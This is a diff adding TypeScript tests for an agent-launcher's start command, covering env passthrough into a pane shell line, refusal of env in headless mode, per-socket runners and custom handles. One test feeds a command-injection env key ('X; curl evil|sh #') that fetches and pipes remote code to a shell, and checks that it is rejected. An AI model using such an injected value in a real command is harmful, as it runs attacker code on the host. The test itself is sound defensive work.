@@ -22,6 +22,7 @@ function okRunner(calls: string[][]): HerdrRunner {
 
 function fresh(over: {
   runner?: HerdrRunner;
+  runnerFactory?: (socket: string) => HerdrRunner;
   spawn?: (argv: string[], cwd: string) => HeadlessChild;
   emit?: (t: string, p?: unknown) => void;
   insertAgentFn?: (...args: unknown[]) => void;
@@ -33,6 +34,7 @@ function fresh(over: {
     db,
     emitEvent: over.emit ?? (() => 0),
     herdrRunner: over.runner,
+    herdrRunnerForSocket: over.runnerFactory,
     spawnHeadless: over.spawn,
     insertAgentFn: over.insertAgentFn as typeof import("../../state/index.ts").insertAgent | undefined,
   }), { db });
@@ -126,6 +128,22 @@ test("agent:start headless refuses a missing prompt", async () => {
   expect(res.ok).toBe(false);
   if (res.ok) throw new Error("unreachable");
   expect(res.error).toMatch(/prompt/);
+});
+
+// buildClaudeArgv has no pane shell line for headless to interpolate env
+// into, so a caller-supplied env would be silently dropped rather than
+// applied; refuse instead of spawning without it.
+test("agent:start headless with env is refused and spawns nothing", async () => {
+  let spawnCalled = false;
+  const h = fresh({ spawn: () => { spawnCalled = true; return { exited: Promise.resolve(0), stdout: async () => "{}" }; } });
+  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", surface: "headless", prompt: "go", env: { HERD_ID: "demo-1" } });
+  expect(res.ok).toBe(false);
+  if (res.ok) throw new Error("unreachable");
+  expect(res.error).toBe("env is only supported for the herdr surface");
+  expect(spawnCalled).toBe(false);
+  const list = await h["agent:list"]({});
+  if (!list.ok) throw new Error("unreachable");
+  expect(list.data.agents).toHaveLength(0);
 });
 
 // R033: an unchecked surface value falls through to the headless spawn path
@@ -271,6 +289,50 @@ test("agent:resume threads the reserved handle back into --name", async () => {
   expect(resumed.ok).toBe(true);
   const paneRun = calls.find((c) => c[0] === "pane" && c[1] === "run");
   expect(paneRun?.[3]).toContain(`'--name' '${started.data.handle}'`);
+});
+
+test("agent:start passes env into the pane command", async () => {
+  const calls: string[][] = [];
+  const h = fresh({ runner: okRunner(calls) });
+  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { HERD_ID: "demo-1" } });
+  expect(res.ok).toBe(true);
+  const paneRun = calls.find((c) => c[0] === "pane" && c[1] === "run");
+  expect(paneRun?.[3]).toContain("HERD_ID='demo-1' claude");
+});
+
+// buildPaneCommand quotes env values but not keys, so a key that is not a
+// plain identifier would ride into the pane's shell line as syntax.
+test("agent:start refuses an env key that is not a shell identifier and launches nothing", async () => {
+  const calls: string[][] = [];
+  const h = fresh({ runner: okRunner(calls) });
+  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { "X; curl evil|sh #": "1" } });
+  expect(res.ok).toBe(false);
+  if (res.ok) throw new Error("unreachable");
+  expect(res.error).toBe("invalid env key");
+  expect(calls).toEqual([]);
+  const list = await h["agent:list"]({});
+  if (!list.ok) throw new Error("unreachable");
+  expect(list.data.agents).toHaveLength(0);
+});
+
+test("agent:start with herdrSocket builds a runner on that socket", async () => {
+  const seenSockets: string[] = [];
+  const h = fresh({
+    runnerFactory: (socket) => { seenSockets.push(socket); return okRunner([]); },
+  });
+  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", herdrSocket: "/tmp/hidden.sock" });
+  expect(res.ok).toBe(true);
+  expect(seenSockets).toEqual(["/tmp/hidden.sock"]);
+});
+
+test("agent:start with handle uses it as --name and reserves no pool handle", async () => {
+  const calls: string[][] = [];
+  const h = fresh({ runner: okRunner(calls) });
+  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", handle: "job-a" });
+  if (!res.ok) throw new Error(res.error);
+  expect(res.data.handle).toBe("job-a");
+  const paneRun = calls.find((c) => c[0] === "pane" && c[1] === "run");
+  expect(paneRun?.[3]).toContain("'--name' 'job-a'");
 });
 
 test("agent:list filters by repo", async () => {
